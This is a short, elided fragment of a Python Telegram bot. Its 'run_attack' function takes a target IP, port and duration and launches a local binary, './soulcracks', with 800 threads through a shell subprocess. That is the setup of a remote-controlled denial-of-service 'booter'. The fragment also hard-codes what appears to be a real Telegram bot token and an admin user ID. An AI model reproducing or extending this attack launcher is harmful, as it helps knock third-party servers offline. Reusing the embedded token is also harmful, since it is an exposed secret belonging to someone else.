...
TELEGRAM_BOT_TOKEN = '7907184516:AAFvrcZM_x5tMGOw9PW-wr7RFnkAyUV6sT0'
ADMIN_USER_ID = 7790541422
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./soulcracks {ip} {port} {duration} 800",  # Default threads set to 800
